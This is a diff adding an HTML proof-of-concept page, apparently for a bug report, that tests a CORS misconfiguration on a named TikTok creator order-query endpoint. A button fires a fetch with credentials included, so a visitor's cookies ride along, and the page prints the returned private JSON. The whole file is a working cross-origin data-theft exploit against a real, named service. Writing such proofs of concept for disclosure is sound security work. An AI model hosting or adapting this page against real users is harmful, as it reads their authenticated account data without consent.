@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>CORS PoC with JSON Pretty-Print</title>
+</head>
+<body>
+  <h1>CORS PoC (JSON Pretty-Print)</h1>
+  <p>
+    This page will attempt to send an authenticated cross-origin request to
+    <strong>https://www.tiktok.com/CreativeOne/OrderQuery/CreatorGetPostItemList?limit=12&amp;page=1</strong>
+    and display the returned JSON in a pretty-printed format below.
+  </p>
+
+  <button id="pocButton">Send Cross-Origin Request</button>
+
+  <!-- A container to hold our JSON output -->
+  <pre id="responseBox" style="border:1px solid #ccc; padding:1em; white-space:pre-wrap;"></pre>
+
+  <script>
+    document.getElementById('pocButton').addEventListener('click', function() {
+      fetch("https://www.tiktok.com/CreativeOne/OrderQuery/CreatorGetPostItemList?limit=12&page=1", {
+        method: "GET",
+        credentials: "include"  // <-- ensures cookies are sent
+      })
+      .then(response => {
+        if (!response.ok) {
+          throw new Error("HTTP error, status = " + response.status);
+        }
+        return response.json(); // parse JSON directly
+      })
+      .then(data => {
+        // Pretty-print JSON
+        const prettyJson = JSON.stringify(data, null, 2);
+        document.getElementById('responseBox').textContent = prettyJson;
+        console.log("Response Data:", data);
+      })
+      .catch(error => {
+        console.error("Request failed:", error);
+        document.getElementById('responseBox').textContent = "Request failed: " + error;
+      });
+    });
+  </script>
+</body>
+</html>
